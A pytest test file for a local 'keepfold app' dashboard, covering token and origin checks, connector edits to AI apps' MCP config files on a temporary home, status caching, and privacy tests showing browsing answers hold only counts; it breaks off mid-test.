"""`keepfold app` (docs/design/keepfold-app.md): auth, GET never changes anything, every connector
on a temp home (add, remove, other keys kept, backups, bad files refused), the status shapes,
the Setup steps, and browsing answers that hold counts only. Nothing runs `claude`, installs or
downloads: every subprocess, opener and runner probe is faked."""

import hashlib
import http.client
import io
import json
import os
import socket
import sys
import threading
import time
import tomllib
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.parse import quote

import pytest
from conftest import windows_browsers

from keepfold import clients, update
from keepfold.app import actions, server, status, targets, wizard

pytestmark = pytest.mark.usefixtures("home")
ENTRY = {"command": "C:\\tools\\keepfold.exe", "args": ["mcp", "--vault", "C:\\notes \"v\""]}
REAL_KEPT = status.kept  # before conftest's fixture makes every probe fresh
REAL_OBSIDIAN = server._obsidian  # before `fakes` replaces it
MARKERS = (b"TITLEMARKER",b"URLMARKER", b"SEARCHMARKER", b"markerdomain", b"EXCERPTMARKER")


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(autouse=True)
def fakes(monkeypatch):
    """Record what would run; nothing real starts, opens or answers."""
    from keepfold import localllm

    calls: list = []

    def run(args, timeout=300):
        calls.append(list(args))
        return False, "faked"

    def popen(*a, **k):
        raise AssertionError("a test must not start a process")

    def no_runner(*a, **k):
        raise OSError("no runner in tests")

    monkeypatch.setattr(targets, "_which", lambda c: None)
    monkeypatch.setattr(targets, "_run", run)
    monkeypatch.setattr(actions, "_popen", popen)
    monkeypatch.setattr(server, "_open", lambda url: calls.append(["open", url]))
    monkeypatch.setattr(server, "_obsidian", lambda: True)  # never this computer's registry
    monkeypatch.setattr(localllm, "_request", no_runner)
    monkeypatch.setattr(localllm, "_lms_exe", lambda cfg: None)
    monkeypatch.setattr(server, "PORT", 0)  # never the owner's app port
    return calls


@pytest.fixture
def vault(root_committed):
    (root_committed / ".keepfold").mkdir(exist_ok=True)
    return root_committed


def _serve(root):
    srv, app = server.make_server(root)
    threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.05},
                     daemon=True).start()
    return srv, app


@pytest.fixture
def app(vault):
    srv, a = _serve(vault)
    yield a
    srv.shutdown()
    srv.server_close()


def call(app, method, path, body=None, *, token=True, host=None, origin=None,
         ctype="application/json"):
    c = http.client.HTTPConnection("127.0.0.1", app.port, timeout=30)
    headers = {"Host": host or f"127.0.0.1:{app.port}"}
    if token:
        headers["X-Keepfold-Token"] = app.token if token is True else token
    if origin:
        headers["Origin"] = origin
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = ctype
    c.request(method, path, body=data, headers=headers)
    r = c.getresponse()
    raw = r.read()
    c.close()
    try:
        js = json.loads(raw)
    except ValueError:
        js = None
    return r.status, js, raw, r


def wait_job(app, seen: list | None = None) -> dict:
    for _ in range(600):
        _, js, raw, _ = call(app, "GET", "/api/job")
        if seen is not None:
            seen.append(raw)
        if js["job"] and not js["job"]["running"]:
            return js["job"]
        time.sleep(0.05)
    raise AssertionError("job did not finish")


def snapshot(*dirs: Path) -> dict:
    out = {}
    for d in dirs:
        for p in sorted(d.rglob("*")):
            out[str(p)] = p.read_bytes() if p.is_file() else None
    return out


# ---- auth ----------------------------------------------------------------------------------


def test_no_token_401_and_the_page_takes_it_from_the_url(app):
    assert call(app, "GET", "/api/status", token=False)[0] == 401
    assert call(app, "GET", "/api/status", token="wrong")[0] == 401
    # the page shell holds no data, so a reload without the key still loads it (the tab keeps
    # the key in sessionStorage); every API call still needs the key
    status_, _, raw, _ = call(app, "GET", "/manage", token=False)
    assert status_ == 200 and app.token.encode() not in raw
    assert call(app, "GET", "/app.js", token=False)[0] == 200
    status_, _, raw, r = call(app, "GET", f"/manage?t={app.token}", token=False)
    assert status_ == 200 and f"/app.js?t={app.token}".encode() in raw
    assert b"<script>" not in raw and b"{{T}}" not in raw  # no inline script
    csp = r.getheader("Content-Security-Policy")
    assert "default-src 'self'" in csp and "unsafe" not in csp
    assert r.getheader("Referrer-Policy") == "no-referrer"
    assert call(app, "GET", f"/app.js?t={app.token}", token=False)[0] == 200
    assert call(app, "GET", f"/app.css?t={app.token}", token=False)[0] == 200
    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
    assert "innerHTML" not in js and "insertAdjacentHTML" not in js
    # FX4: the browser asks for /favicon.ico without the key: the app's icon, not a 401
    st, _, body, r = call(app, "GET", "/favicon.ico", token=False)
    assert st == 200 and body == (server.ASSETS.parent / "keepfold.ico").read_bytes()
    assert r.getheader("Content-Type") == "image/x-icon"
    assert call(app, "GET", "/favicon.png", token=False)[0] == 401  # only that path


def test_home_is_the_live_dashboard_and_manage_the_old_page(app):
    """`/` is the dashboard filled live from /api/home: no inline script or style and no data
    in the page; its files load without the key; every API call still needs it."""
    status_, _, raw, r = call(app, "GET", f"/?t={app.token}", token=False)
    assert status_ == 200 and b'id="data"' not in raw and b"{{" not in raw
    assert b"<script>" not in raw and b"<style>" not in raw and b"http-equiv" not in raw
    for name in ("dashboard.css", "d3.v7.min.js", "brain3d.js", "dashboard.js"):
        assert f"/{name}?t={app.token}".encode() in raw
        st, _, body, rr = call(app, "GET", f"/{name}", token=False)
        assert st == 200 and body == (server.ASSETS.parent / name).read_bytes()
        assert rr.getheader("Content-Security-Policy") == server.CSP
    csp = r.getheader("Content-Security-Policy")
    assert "default-src 'self'" in csp and "unsafe" not in csp
    assert r.getheader("Referrer-Policy") == "no-referrer"
    raw = call(app, "GET", "/?t=wrong", token=False)[2]
    assert app.token.encode() not in raw and b"/dashboard.js?t=\"" in raw
    assert call(app, "GET", "/api/home", token=False)[0] == 401
    assert call(app, "GET", "/api/home/version", token="wrong")[0] == 401
    assert call(app, "GET", "/api/home/version")[0] == 200
    assert b'<a href="/">Home</a>' in call(app, "GET", "/manage", token=False)[2]
    assert call(app, "POST", "/", {})[0] == 405


def test_first_run_home_goes_to_setup(home):
    srv, a = _serve(None)
    try:
        st, _, _, r = call(a, "GET", f"/?t={a.token}", token=False)
        assert st == 302 and r.getheader("Location") == f"/manage?t={a.token}#setup"
        st, _, _, r = call(a, "GET", "/", token=False)
        assert st == 302 and r.getheader("Location") == "/manage#setup"
        assert call(a, "GET", "/manage", token=False)[0] == 200
    finally:
        srv.shutdown()
        srv.server_close()


def test_start_tries_the_fixed_port_first(vault, monkeypatch):
    """One origin across launches keeps the page's theme and brain style; a taken port falls
    back to any free one."""
    other = socket.socket()
    other.bind(("127.0.0.1", 0))
    other.listen()
    try:
        for port, busy in ((_free_port(), False), (other.getsockname()[1], True)):
            monkeypatch.setattr(server, "PORT", port)
            srv, a, url = server.start(vault, echo=lambda *x: None)
            try:
                assert (a.port == port) is not busy and url.startswith(f"http://127.0.0.1:{a.port}/")
            finally:
                server.finish(srv, a)
    finally:
        other.close()


def test_wrong_host_or_origin_403(app):
    assert call(app, "GET", "/api/status", host="evil.example:80")[0] == 403
    assert call(app, "GET", "/api/status", host=f"127.0.0.1:{app.port + 1}")[0] == 403
    assert call(app, "GET", "/api/status", origin="http://evil.example")[0] == 403
    assert call(app, "POST", "/api/quit", {}, origin="null")[0] == 403
    assert call(app, "GET", "/api/status", origin=f"http://127.0.0.1:{app.port}")[0] == 200
    assert call(app, "GET", "/api/status", host=f"localhost:{app.port}")[0] == 200
    assert not app.stop.is_set()


def test_writes_need_post_with_json(app):
    assert call(app, "POST", "/api/quit", {}, ctype="text/plain")[0] == 415
    assert call(app, "POST", "/api/quit", {}, token=False)[0] == 401
    assert call(app, "GET", "/api/quit")[0] == 405
    assert call(app, "PUT", "/api/quit", {})[0] == 405
    assert not app.stop.is_set()
    assert call(app, "POST", "/api/quit", {})[0] == 200
    assert app.stop.is_set()


def test_get_never_changes_anything(app, vault, home, fakes):
    (home / ".cursor").mkdir()
    before = snapshot(home, vault)
    for path in [*app.get, *app.post]:  # a site or passage with none named: not found
        code = call(app, "GET", path)[0]
        assert code in ((404,) if path in ("/api/home/site", "/api/chat/passage")
                        else (200, 405)), path
    after = snapshot(home, vault)
    # /api/home lays the brain out once and keeps it there: a view cache, as the dashboard's
    after.pop(str(vault / ".keepfold" / "brain-layout.json"), None)
    assert after == before
    assert app.jobs.cur is None and not app.stop.is_set()
    assert fakes == []  # A1/A10: no page load runs a program (no schtasks query any more)


# ---- status --------------------------------------------------------------------------------


def test_status_shapes(app, vault):
    _, js, _, _ = call(app, "GET", "/api/status")
    assert js["first_run"] is False and js["vault"] == str(vault.resolve())
    ids = [r["id"] for r in js["rows"]]
    assert ids == ["vault", "git", "embed", "apps", "llm", "history"]  # "moved": had Cortex only
    for r in js["rows"]:
        assert r["state"] in ("ok", "warn", "off") and r["label"] and r["detail"]
    v = js["rows"][0]
    assert v["state"] == "ok" and v["count"] > 0
    for path in ("/api/connect", "/api/llm", "/api/browse", "/api/vault", "/api/setup"):
        code, body, _, _ = call(app, "GET", path)
        assert code == 200 and isinstance(body, dict), path
    _, llm, _, _ = call(app, "GET", "/api/llm")
    assert llm["enabled"] is False and llm["lms"] is None and llm["ollama"] is None


def test_status_keeps_its_slow_probes_and_asks_again_after_an_action(app, monkeypatch):
    """The Status board's slow probes (runners, `lms`) are kept: a second
    read answers at once without asking them; any POST, a finished job and Check again
    (?fresh=1) ask again; a stale answer is refreshed in the background."""
    monkeypatch.setattr(status, "kept", REAL_KEPT)
    status.forget()
    asked = []

    hold, finished = threading.Event(), []

    def slow_ollama():
        asked.append("ollama")
        if len(asked) >= 4:  # the background refresh: held, so a read that waited on it shows
            hold.wait(10)
            finished.append(1)
        return ["qwen3:1.7b"]
    monkeypatch.setattr(status, "ollama_models", slow_ollama)
    first = call(app, "GET", "/api/status")[1]
    assert asked == ["ollama"]
    again = call(app, "GET", "/api/status")[1]
    assert len(asked) == 1  # kept
    assert again["rows"] == first["rows"]
    call(app, "GET", "/api/status?fresh=1")  # Check again
    assert len(asked) == 2
    call(app, "POST", "/api/whats_new/seen", {})  # any action
    call(app, "GET", "/api/status")
    assert len(asked) == 3
    monkeypatch.setattr(status, "KEEP_S", 0.0)  # stale: the kept answer now, a fresh one behind
    assert call(app, "GET", "/api/status")[1]["rows"] == first["rows"]  # the kept answer, now
    assert not finished  # the fresh one is still running behind it: the read did not wait
    for _ in range(50):
        if len(asked) == 4:
            break
        time.sleep(0.05)
    assert len(asked) == 4
    hold.set()
    status.forget()


def test_status_is_warmed_at_start_and_the_first_read_waits_for_it(app, monkeypatch):
    """`warm_status` (run by `start`) asks the slow probes once in the background; a read made
    meanwhile waits for that answer instead of asking again, and later reads are kept."""
    monkeypatch.setattr(status, "kept", REAL_KEPT)
    status.forget()
    asked = []
    monkeypatch.setattr(status, "ollama_models", lambda: (asked.append(1), time.sleep(0.5), [])[2])
    app.warm_status()
    assert call(app, "GET", "/api/status")[0] == 200 and asked == [1]  # asked once, not twice
    call(app, "GET", "/api/status")
    assert asked == [1]
    status.forget()


def test_setup_keeps_its_slow_probes_and_the_warm_up_asks_them(app, monkeypatch):
    """Settings opens on Setup until it is done: its runner probes (~2.7 s on Windows), also
    the Local model page's, are asked by the warm-up at start and kept, so neither page's
    first read waits on them; any action asks again."""
    monkeypatch.setattr(status, "kept", REAL_KEPT)
    status.forget()
    asked = []
    monkeypatch.setattr(status, "ollama_models", lambda: (asked.append(1), time.sleep(0.4), [])[2])
    app.warm_status()
    app.warming.join()
    n = len(asked)
    assert n >= 1
    for path in ("/api/setup", "/api/llm"):  # Setup and the Local model page
        assert call(app, "GET", path)[0] == 200
        assert len(asked) == n, path  # kept from the warm-up
    call(app, "POST", "/api/whats_new/seen", {})  # any action
    call(app, "GET", "/api/setup")
    assert len(asked) == n + 1
    status.forget()


def test_status_logs_only_unexpected_errors(monkeypatch, caplog):
    """T8: a runner that is not running stays silent; a bug is logged and still reads as
    "not available"."""
    from keepfold import browse, localllm

    assert status.ollama_models() is None and status.browse_settings()["available"] is True
    assert not caplog.records  # the fixture's runner raises OSError: an expected state

    def boom(*a, **k):
        raise RuntimeError("bug")

    monkeypatch.setattr(localllm, "_request", boom)
    monkeypatch.setattr(browse, "load_settings", boom)
    assert status.ollama_models() is None and status.browse_settings() == {"available": False}
    assert [r.levelname for r in caplog.records] == ["ERROR", "ERROR"]
    assert all(r.exc_info for r in caplog.records)


def test_lands_on_setup_until_the_vault_and_an_app_or_a_skipped_connect(app, monkeypatch):
    """R5 F3 (decided): Status once the vault is set up and an AI app is connected, or Connect
    was skipped; the skip is kept in ~/.keepfold/config.yaml and un-skipping clears it."""
    from keepfold import taint

    taint.write_config({"app": {"other": 1}})
    assert call(app, "GET", "/api/status")[1]["land"] == "setup"  # vault only
    assert call(app, "GET", "/api/setup")[1]["connect_skipped"] is False
    assert call(app, "POST", "/api/setup/skip", {"skipped": True})[0] == 200
    assert taint.config()["app"] == {"other": 1, "connect_skipped": True}
    assert call(app, "GET", "/api/status")[1]["land"] == "status"
    assert call(app, "GET", "/api/setup")[1]["connect_skipped"] is True
    assert call(app, "POST", "/api/setup/skip", {"skipped": False})[0] == 200
    assert taint.config()["app"] == {"other": 1}
    assert call(app, "GET", "/api/status")[1]["land"] == "setup"
    assert call(app, "POST", "/api/setup/skip", {"skipped": "yes"})[0] == 400
    monkeypatch.setattr(targets, "describe", lambda base: [{"label": "Claude", "connected": True}])
    assert call(app, "GET", "/api/status")[1]["land"] == "status"


def test_the_welcome_guide_is_done_once_and_keeps_the_other_app_keys(app):
    """WG: Finish, Skip, Esc or close posts welcome_done: true into config.yaml's `app:` (the
    other keys kept); only true is accepted, and /api/setup reports it."""
    from keepfold import taint

    taint.write_config({"app": {"other": 1, "first_run_hidden": True}})
    assert call(app, "GET", "/api/setup")[1]["welcome_done"] is False
    # the page's quick look at boot: no probes, just the flag and whether a vault is set up
    assert call(app, "GET", "/api/app/welcome")[1] == {"welcome_done": False, "vault": True}
    for bad in ({"welcome_done": False}, {"welcome_done": "yes"}, {},
                {"welcome_done": True, "other": 2}):
        assert call(app, "POST", "/api/app/welcome", bad)[0] == 400, bad
    assert taint.config()["app"] == {"other": 1, "first_run_hidden": True}
    assert call(app, "POST", "/api/app/welcome", {"welcome_done": True})[1] == {
        "welcome_done": True}
    assert taint.config()["app"] == {"other": 1, "first_run_hidden": True, "welcome_done": True}
    assert call(app, "GET", "/api/setup")[1]["welcome_done"] is True
    assert call(app, "GET", "/api/app/welcome")[1]["welcome_done"] is True


def test_llm_board_shows_a_refused_config(app):
    """R5 F4: the Local model page reads `localllm.status`, so a cloud model says why."""
    from keepfold import taint

    taint.write_config({"localllm": {"enabled": True, "model": "gpt-oss:120b-cloud"}})
    _, llm, _, _ = call(app, "GET", "/api/llm")
    assert "cloud model is refused" in llm["error"]
    taint.write_config({"localllm": {"enabled": True}})
    assert call(app, "GET", "/api/llm")[1]["error"] is None


def test_first_run_without_a_vault():
    srv, a = _serve(None)
    try:
        _, js, _, _ = call(a, "GET", "/api/status")
        assert js["first_run"] is True and js["rows"][0]["state"] == "off"
        code, body, _, _ = call(a, "POST", "/api/vault/backup", {})
        assert code == 400 and "vault" in body["error"]
    finally:
        srv.shutdown()
        srv.server_close()


def daytime(monkeypatch):
    """Noon for start_url: by night the link is /manage?t=…#tonight (test_tonight covers it)."""
    import functools
    monkeypatch.setattr(server, "start_url", functools.partial(
        server.start_url, now=datetime(2026, 11, 20, 12)))


def test_run_prints_the_link_and_quits(vault, monkeypatch):
    daytime(monkeypatch)
    lines: list[str] = []
    t = threading.Thread(target=server.run, args=(vault,),
                         kwargs={"open_browser": False, "echo": lines.append}, daemon=True)
    t.start()
    for _ in range(100):
        if lines:
            break
        time.sleep(0.05)
    url = lines[0].split(": ", 1)[1]
    port, token = int(url.split(":")[2].split("/")[0]), url.split("?t=")[1]
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    c.request("POST", "/api/quit", body=b"{}", headers={
        "Host": f"127.0.0.1:{port}", "X-Keepfold-Token": token,
        "Content-Type": "application/json"})
    assert c.getresponse().status == 200
    t.join(15)
    assert not t.is_alive()


# ---- connectors on temp homes --------------------------------------------------------------


JSON_TARGETS = {"antigravity": ".gemini/config/mcp_config.json", "cursor": ".cursor/mcp.json",
                "windsurf": ".codeium/windsurf/mcp_config.json", "lmstudio": ".lmstudio/mcp.json",
                "gemini-cli": ".gemini/settings.json", "vscode": None}


def _baks(p: Path) -> list[Path]:
    return sorted(p.parent.glob(p.name + ".keepfold-*.bak"))


@pytest.mark.parametrize("tid", JSON_TARGETS)
def test_json_connector_add_remove_keep_backup(home, tid):
    rel = JSON_TARGETS[tid]
    path = home / rel if rel else targets._vscode_user() / "mcp.json"  # APPDATA is in home
    assert str(path).startswith(str(home))
    key = "servers" if tid == "vscode" else "mcpServers"
    t = targets.by_id()[tid]
    assert not t.detect() and not t.connected()
    path.parent.mkdir(parents=True)
    assert t.detect()
    old = {"theme": "dark", key: {"other": {"command": "x"}}}
    path.write_text(json.dumps(old, indent=4), encoding="utf-8")
    original = path.read_bytes()
    assert [r["change"] for r in t.plan(True, ENTRY)][:1] == ["add"]
    t.apply(ENTRY)
    data = json.loads(path.read_text(encoding="utf-8"))
    assert data["theme"] == "dark" and data[key]["other"] == {"command": "x"}
    assert data[key]["keepfold"] == ({"type": "stdio", **ENTRY} if tid == "vscode" else ENTRY)
    assert t.connected() and t.plan(True, ENTRY) == []
    writes = 2 if tid == "gemini-cli" else 1  # R7: Gemini's settings.json also gets the hooks
    baks = [b.read_bytes() for b in _baks(path)]
    assert original in baks and len(baks) == writes
    t.remove()
    data = json.loads(path.read_text(encoding="utf-8"))
    assert "keepfold" not in data[key] and data[key]["other"] == {"command": "x"}
    assert data["theme"] == "dark" and not t.connected() and len(_baks(path)) == 2 * writes
    assert "hooks" not in data


def test_antigravity_moves_to_its_2_0_config_file(home):
    """Antigravity 2.0 (editor, app and `agy`) reads ~/.gemini/config/mcp_config.json: an entry
    in the old ~/.gemini/antigravity file shows out of date until Apply writes the new one, and
    remove cleans both."""
    old = home / ".gemini" / "antigravity" / "mcp_config.json"
    new = home / ".gemini" / "config" / "mcp_config.json"
    old.parent.mkdir(parents=True)
    old.write_text(json.dumps({"mcpServers": {"keepfold": ENTRY}}), encoding="utf-8")
    t = targets.by_id()["antigravity"]
    assert t.detect() and t.connected() and t.paths() == [new]
    assert [r["change"] for r in t.plan(True, ENTRY)] == ["add"]  # describe: stale
    t.apply(ENTRY)
    assert json.loads(new.read_text(encoding="utf-8"))["mcpServers"]["keepfold"] == ENTRY
    assert t.plan(True, ENTRY) == []
    t.remove()
    assert not t.connected()
    for p in (old, new):
        assert "keepfold" not in json.loads(p.read_text(encoding="utf-8"))["mcpServers"]


@pytest.mark.parametrize("bad", ["{not json", "[1, 2]", '{"mcpServers": []}',
                                 '{\n  // a comment\n  "mcpServers": {}\n}'])
def test_bad_json_is_refused_and_untouched(home, bad):
    path = home / ".cursor" / "mcp.json"
    path.parent.mkdir(parents=True)
    path.write_text(bad, encoding="utf-8")
    t = targets.by_id()["cursor"]
    rows = t.plan(True, ENTRY)
    assert rows[0]["change"] == "error" and "untouched" in rows[0]["detail"]
    with pytest.raises(ValueError, match="untouched"):
        t.apply(ENTRY)
    assert path.read_text(encoding="utf-8") == bad and not _baks(path)


def test_new_file_gets_no_backup(home):
    (home / ".cursor").mkdir()
    t = targets.by_id()["cursor"]
    t.apply(ENTRY)
    p = home / ".cursor" / "mcp.json"
    assert json.loads(p.read_text())["mcpServers"]["keepfold"] == ENTRY and not _baks(p)


def test_claude_desktop_uses_its_config_folder(home):
    folder = home / {"win32": "APPDATA", "darwin": "Library/Application Support"}.get(
        sys.platform, ".config") / "Claude"  # clients.claude_desktop_config_paths
    t = targets.by_id()["claude-desktop"]
    if not str(folder).startswith(str(home)):
        pytest.skip("APPDATA is not under the temp home")
    assert not t.detect()
    folder.mkdir(parents=True)
    cfg = folder / "claude_desktop_config.json"
    cfg.write_text('{"preferences": {"x": 1}}', encoding="utf-8")
    assert t.detect() and t.plan(True, ENTRY)[0]["file"] == str(cfg)
    t.apply(ENTRY)
    data = json.loads(cfg.read_text())
    assert data["preferences"] == {"x": 1} and data["mcpServers"]["keepfold"] == ENTRY
    t.remove()
    assert json.loads(cfg.read_text())["mcpServers"] == {} and len(_baks(cfg)) == 2


def test_gemini_block_between_markers(home):
    (home / ".gemini").mkdir()
    md = home / ".gemini" / "GEMINI.md"
    md.write_text("# Mine\n\nKeep this.\n", encoding="utf-8")
    t = targets.by_id()["gemini-cli"]
    assert {r["file"] for r in t.plan(True, ENTRY)} == {str(home / ".gemini" / "settings.json"),
                                                        str(md)}
    t.apply(ENTRY)
    t.apply(ENTRY)  # idempotent: one block
    text = md.read_text(encoding="utf-8")
    assert text.count(targets.Gemini.START) == 1 and text.startswith("# Mine\n\nKeep this.\n")
    t.remove()
    assert md.read_text(encoding="utf-8") == "# Mine\n\nKeep this.\n"
    assert t.plan(False) == []


CODEX = """# my settings
model = "o3"

[mcp_servers.other]
command = "other"
args = ["a"]

[mcp_servers.other.env]
KEY = "v"

[profiles.fast]
model = "o4-mini"
"""


def test_codex_toml_exact_writer(home):
    p = home / ".codex" / "config.toml"
    p.parent.mkdir()
    p.write_text(CODEX, encoding="utf-8")
    t = targets.by_id()["codex"]
    assert t.detect() and not t.connected()
    t.apply(ENTRY)
    data = tomllib.loads(p.read_text(encoding="utf-8"))
    assert data["mcp_servers"]["keepfold"] == ENTRY and data["model"] == "o3"
    assert data["mcp_servers"]["other"]["env"] == {"KEY": "v"}
    assert data["profiles"]["fast"]["model"] == "o4-mini"
    assert p.read_text(encoding="utf-8").startswith(CODEX.rstrip("\n"))
    assert t.connected() and t.plan(True, ENTRY) == []
    t.remove()
    assert p.read_text(encoding="utf-8") == CODEX and len(_baks(p)) == 2


def test_codex_refuses_bad_or_inline_toml(home):
    p = home / ".codex" / "config.toml"
    p.parent.mkdir()
    t = targets.by_id()["codex"]
    for bad in ('model = "o3\n', 'mcp_servers = { keepfold = { command = "x" } }\n'):
        p.write_text(bad, encoding="utf-8")
        assert t.plan(True, ENTRY)[0]["change"] == "error"
        with pytest.raises(ValueError):
            t.apply(ENTRY)
        assert p.read_text(encoding="utf-8") == bad and not _baks(p)


def test_codex_sub_table_of_keepfold_goes_too(home):
    p = home / ".codex" / "config.toml"
    p.parent.mkdir()
    p.write_text('[mcp_servers.keepfold]\ncommand = "old"\n\n[mcp_servers.keepfold.env]\nA = "1"\n'
                 '\n[tui]\nx = 1\n', encoding="utf-8")
    targets.by_id()["codex"].apply(ENTRY)
    data = tomllib.loads(p.read_text(encoding="utf-8"))
    assert data["mcp_servers"]["keepfold"] == ENTRY and data["tui"] == {"x": 1}


def test_claude_code_plugin_via_cli(home, monkeypatch, fakes):
    monkeypatch.setattr(targets, "_which", lambda c: "C:\\bin\\claude.exe" if c == "claude"
                        else None)
    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: (fakes.append(args),
                                                                     (True, "ok"))[1])
    t = targets.by_id()["claude-code"]
    assert t.detect() and not t.connected()
    plan = t.plan(True, ENTRY)
    assert len(plan) == 1 and "claude plugin install keepfold@keepfold" in plan[0]["detail"]
    t.apply(ENTRY)
    from keepfold import cli
    assert fakes[-2:] == [["C:\\bin\\claude.exe", "plugin", "marketplace", "add",
                           str(cli._marketplace())],
                          ["C:\\bin\\claude.exe", "plugin", "install", "keepfold@keepfold"]]
    s = home / ".claude" / "settings.json"
    s.parent.mkdir()
    s.write_text('{"enabledPlugins": {"keepfold@keepfold": true}}', encoding="utf-8")
    assert t.connected() and t.plan(True, ENTRY) == []
    t.remove()
    assert fakes[-1] == ["C:\\bin\\claude.exe", "plugin", "uninstall", "keepfold@keepfold"]


def test_claude_code_without_cli_edits_claude_json(home):
    p = home / ".claude.json"
    p.write_text('{"numStartups": 3, "mcpServers": {"x": {"command": "y"}}}', encoding="utf-8")
    t = targets.by_id()["claude-code"]
    assert t.detect()
    t.apply(ENTRY)
    data = json.loads(p.read_text())
    assert data["numStartups"] == 3 and data["mcpServers"]["x"] == {"command": "y"}
    assert data["mcpServers"]["keepfold"] == ENTRY and t.connected()
    t.remove()
    assert "keepfold" not in json.loads(p.read_text())["mcpServers"]


def test_connect_over_the_api(app, home, vault):
    (home / ".cursor").mkdir()
    _, js, _, _ = call(app, "GET", "/api/connect")
    rows = {r["id"]: r for r in js["targets"]}
    assert len(rows) == 13 and rows["cursor"]["detected"] and not rows["windsurf"]["detected"]
    from keepfold import packs  # CN: Copy instructions copies this, on rows saying where
    assert js["instructions"] == packs.USE_TEXT and rows["cursor"]["paste"] == targets.PASTE_CURSOR
    assert str(vault.resolve()) in json.loads(rows["cursor"]["snippet"])[
        "mcpServers"]["keepfold"]["args"]
    want = {"cursor": True, "windsurf": True}
    _, plan, _, _ = call(app, "POST", "/api/connect/plan", {"want": want})
    rule = home / ".cursor" / "rules" / "keepfold.mdc"
    assert [(r["id"], r["change"], r["file"]) for r in plan["rows"]] == [  # windsurf: not found
        ("cursor", "add", str(home / ".cursor" / "mcp.json")), ("cursor", "add", str(rule))]
    assert not (home / ".cursor" / "mcp.json").exists()
    assert call(app, "POST", "/api/connect/apply", {"want": want})[0] == 200
    job = wait_job(app)
    assert job["error"] is None and [r["id"] for r in job["result"]["rows"]] == ["cursor"] * 2
    assert "keepfold" in json.loads((home / ".cursor" / "mcp.json").read_text())["mcpServers"]
    assert "keepfold_prime" in rule.read_text(encoding="utf-8")
    call(app, "POST", "/api/connect/apply", {"want": {"cursor": False}})
    wait_job(app)
    assert json.loads((home / ".cursor" / "mcp.json").read_text())["mcpServers"] == {}
    assert not rule.exists()  # only Keepfold's own rule was in it
    assert call(app, "POST", "/api/connect/plan", {"want": {"cursor": "yes"}})[0] == 400


# ---- browsing: counts only -----------------------------------------------------------------


def _browsing(home: Path, vault: Path) -> None:
    """Synthetic history and an inbox the old extension left, every text field carrying a
    marker."""
    from keepfold.browse.selftest import _chromium

    now = datetime.now(UTC) - timedelta(days=1)
    _chromium(home / "LOCALAPPDATA" / "Google" / "Chrome" / "User Data" / "Default" / "History",
              [(now, "https://markerdomain.example/URLMARKER", "Chess TITLEMARKER"),
               (now + timedelta(minutes=5), "https://www.google.com/search?q=SEARCHMARKER",
                "SEARCHMARKER - Google"),
               (now + timedelta(minutes=9), "https://example.org/a", "Algebra TITLEMARKER")])
    d = vault / ".keepfold" / "browse"
    d.mkdir(parents=True)
    rec = {"url": "https://markerdomain.example/x?URLMARKER=1", "title": "Read TITLEMARKER",
           "start": now.strftime("%Y-%m-%dT%H:%M:%S.000Z"), "active_ms": 60000,
           "excerpt": "EXCERPTMARKER text", "kind": "page"}
    (d / f"inbox-{now:%Y-%m-%d}.jsonl").write_text(json.dumps(rec) + "\n", encoding="utf-8")


def test_browsing_answers_hold_counts_only(app, home, vault, monkeypatch):
    _browsing(home, vault)
    windows_browsers(monkeypatch)
    seen: list[bytes] = []
    for path in ("/api/status", "/api/browse", "/api/setup"):
        seen.append(call(app, "GET", path)[2])
    for path in ("/api/browse/scan", "/api/browse/process", "/api/browse/selftest"):
        code, _, raw, _ = call(app, "POST", path, {})
        assert code == 200, raw
        seen.append(raw)
        job = wait_job(app, seen)
        assert job["error"] is None, job
        if path.endswith("scan"):
            rows = job["result"]["rows"]
            assert rows[0]["source"] == "chrome/Default" and rows[0]["visits"] == 3
        if path.endswith("process"):
            assert job["result"]["counts"]  # numbers
            assert any((vault / "browse" / "private").glob("*.md"))  # it really ran
    seen.append(call(app, "GET", "/api/browse")[2])
    every = b"".join(seen)
    assert every and not [m for m in MARKERS if m in every]
    _, b, _, _ = call(app, "GET", "/api/browse")
    assert b["last_processed"] and "paired" not in b and "receiver" not in b


def test_past_history_scan_then_import_mocked(app, home, monkeypatch):
    from keepfold.browse import build, sources

    found = [sources.Source("chrome", "Default", home / "a"),
             sources.Source("comet", "Default", home / "b")]
    monkeypatch.setattr(sources, "discover", lambda *a, **k: found)
    monkeypatch.setattr(sources, "scan", lambda srcs, settings, tz=None: [
        {"source": "chrome/Default", "visits": 12, "searches": 2, "first": "2021-01-02",
         "last": "2026-11-16", "dropped": 1, "private": 3, "kept": 8, "maybe": 0},
        {"source": "comet/Default", "error": "OSError", "why": "locked TITLEMARKER"}])
    runs = []

    def fake_run(v, srcs, settings, *, embed=None, runner=None, budget=None, progress=None,
                 **kw):
        runs.append(([s.key for s in srcs], kw))
        for s in srcs:
            progress(s.key, 12, 12, None)
        return {"sources": len(srcs), "kept": 8, "private": 3, "dropped": 1,
                "private_written": 5, "public_written": 0, "days_from": "2020-12-28",
                "visible_to_claude": False}

    monkeypatch.setattr(build, "run", fake_run)
    from keepfold import semantic
    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default"]})
    job = wait_job(app)  # no search model: it stops first and offers the download
    assert job["result"]["need"] == "embed" and "search model first" in job["result"]["lines"][0]
    assert runs == []
    monkeypatch.setattr(semantic, "load_embedder", lambda *a, **k: lambda texts: None)
    _, b, _, _ = call(app, "GET", "/api/browse")
    assert [s["key"] for s in b["history"]["sources"]] == ["chrome/Default", "comet/Default"]
    assert "visits" not in b["history"]["sources"][0]  # found by file; not read until a scan
    seen: list[bytes] = []
    call(app, "POST", "/api/browse/scan", {"from": "setup"})
    assert wait_job(app, seen)["section"] == "setup"
    _, s, raw, _ = call(app, "GET", "/api/setup")
    hs = s["history"]["sources"]
    assert hs[0]["visits"] == 12 and hs[0]["first"] == "2021-01-02" and hs[1]["error"] is True
    assert not s["history"]["done"]
    call(app, "POST", "/api/browse/import", {"sources": ["chrome/Default"]})
    job = wait_job(app, seen)
    assert [(k, {x: kw[x] for x in kw if x != "step"}) for k, kw in runs] == [
        (["chrome/Default"], {"takeout": None, "summaries": False})]  # no `since`: all of it
    c = job["result"]["counts"]
